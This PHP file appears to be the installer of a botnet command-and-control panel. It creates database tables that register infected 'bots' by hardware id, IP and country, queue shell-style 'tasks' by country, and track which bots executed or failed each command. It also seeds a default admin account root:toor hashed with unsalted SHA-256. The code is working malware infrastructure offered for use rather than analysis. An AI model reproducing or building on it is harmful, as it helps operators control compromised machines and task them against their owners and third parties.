<?php

if(!isset($GLOBALS['in_script']) && !isset($GLOBALS['in_gate'])) die("Direct access not allowed!");

$install = null;

if(!isset($GLOBALS['db_name']) || empty($GLOBALS['db_name']))
	die(infoMsg('Enter DATABASE in includes/config.php.', 'danger', true));
	
db_query('CREATE DATABASE IF NOT EXISTS '.$GLOBALS['db_name']);
db_query('USE '.$GLOBALS['db_name']);

if (!db_table_exists('users')) {
	db_query("CREATE TABLE IF NOT EXISTS `users` (`id` int(5) NOT NULL AUTO_INCREMENT, `user` varchar(65) NOT NULL, `pass` varchar(65) NOT NULL, `role` int(1) NOT NULL DEFAULT 3, PRIMARY KEY(`id`));");
	$install .= 'Installed users table.<br/>';
}

if (!db_table_exists('settings')) {
	db_query("CREATE TABLE IF NOT EXISTS `settings` (`id` int(5) NOT NULL AUTO_INCREMENT, `name` varchar(65) NOT NULL, `value` varchar(65) NOT NULL, PRIMARY KEY(`id`));");
	$install .= 'Installed settings table.<br/>';
}

if (!db_table_exists('bots')) {
	db_query("CREATE TABLE IF NOT EXISTS `bots` (`id` int(5) NOT NULL AUTO_INCREMENT, `hwid` varchar(65) NOT NULL, `os` varchar(65) NOT NULL, `ip` varchar(65) NOT NULL, `country` varchar(65) NOT NULL, `uid` int(5) DEFAULT NULL, `date` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY(`id`));");
	$install .= 'Installed bots table.<br/>';
}

if (!db_table_exists('tasks')) {
	db_query("CREATE TABLE IF NOT EXISTS `tasks` (`id` int(11) NOT NULL AUTO_INCREMENT, `countries` TEXT DEFAULT '', `command` varchar(255) NOT NULL, `start` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, `stop` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, `count` int(10) DEFAULT NULL, `received` int(10) DEFAULT NULL, `executed` int(10) DEFAULT NULL, `failed` int(10) DEFAULT NULL, `uid` int(5) DEFAULT NULL, PRIMARY KEY(`id`));");
	$install .= 'Installed tasks table.<br/>';
}

if (!db_table_exists('senttasks')) {
	db_query("CREATE TABLE IF NOT EXISTS `senttasks` (`id` int(5) NOT NULL AUTO_INCREMENT, `tid` int(5) DEFAULT NULL, `hwid` varchar(65) NOT NULL, `status` int(1) DEFAULT -1, PRIMARY KEY(`id`));");
	$install .= 'Installed senttasks table.<br/>';
}

if (!db_table_exists('error')) {
	db_query("CREATE TABLE IF NOT EXISTS `error` (`id` int(5) NOT NULL AUTO_INCREMENT, `tid` int(5) DEFAULT NULL, `hwid` varchar(65) NOT NULL, `err` varchar(128) NOT NULL, `date` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY(`id`));");
	$install .= 'Installed error table.<br/>';
}

if (db_table_empty('users')) {
	db_query("INSERT INTO `users` (`user`, `pass`, `role`) VALUES ('root', :1, 1)", hash('sha256', 'toor'));
	$install .= 'Added new admin root:toor.<br/>';
}

if (db_table_empty('settings')) {
	db_query("INSERT INTO `settings` (`name`, `value`) VALUES ('Stats', '3'), ('Bots', '3'), ('Tasks', '2'), ('Debug', '2'), ('Users', '1')");
	$install .= 'Added settings.<br/>';
}

if ($install !== null) die(infoMsg($install.'Install finished.<br/>', 'success', true));
if (!db_table_exists('ip2c') || db_table_empty('ip2c'))	die(infoMsg('Install complete.<br/>Import ip2c.sql now.', 'info', true));

?>